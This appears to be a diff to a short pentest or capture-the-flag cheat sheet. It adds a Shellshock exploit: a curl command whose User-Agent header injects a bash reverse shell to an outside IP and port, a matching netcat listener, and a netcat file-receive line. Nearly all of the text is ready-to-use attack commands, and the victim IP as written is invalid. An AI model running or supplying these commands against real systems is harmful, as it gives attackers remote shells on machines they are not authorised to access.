@@ -1,3 +1,11 @@
+__shellshock__ (victim)
+
+curl http://192.168.8.805/cgi-bin/test.cgi -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.0.107/33444 0>&1'
+
+__shellshock__ (host)
+
+nc -lvnp 33444
+
 __send file through netcat(listener)__
 
 nc -lvnp port > flag.txt
